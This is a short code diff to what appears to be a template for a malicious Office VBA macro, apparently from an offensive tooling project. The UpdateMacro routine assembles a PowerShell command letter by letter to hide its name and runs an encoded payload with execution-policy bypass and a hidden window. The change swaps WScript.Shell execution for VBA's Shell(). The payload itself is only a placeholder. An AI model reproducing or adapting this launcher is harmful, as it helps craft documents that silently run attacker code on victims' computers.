@@ -388,7 +388,7 @@ UpdateMacro
 End Sub
 
 Sub UpdateMacro()
-Dim str, exec, wsh 
+Dim str, exec 
 
 str = ""
 '+$payloadbits+'
@@ -408,8 +408,7 @@ exec = exec + "x"
 exec = exec + "e"
 exec = exec + " -exec bypass -Noninteractive -windowstyle hidden -e " & str
 
-Set wsh = CreateObject( "WScript.Shell" )
-wsh.Exec(exec)
+Shell(exec)
 
 End Sub'
 
